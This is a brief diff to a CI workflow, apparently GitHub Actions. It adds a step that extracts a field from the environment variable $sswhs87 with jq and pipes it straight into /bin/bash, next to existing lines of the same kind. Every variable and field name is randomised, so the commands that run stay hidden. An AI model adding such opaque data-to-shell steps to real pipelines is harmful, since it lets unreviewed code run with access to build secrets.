@@ -22,6 +22,7 @@ jobs:
           echo $trrz24 | jq -r .ujywt85 | /bin/bash
           echo $wtj27 | jq -r .hb13 | /bin/bash
           echo $zk3360 | jq -r .c627 | /bin/bash
+          printf '%s' "$sswhs87" | jq -r .caf3075 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
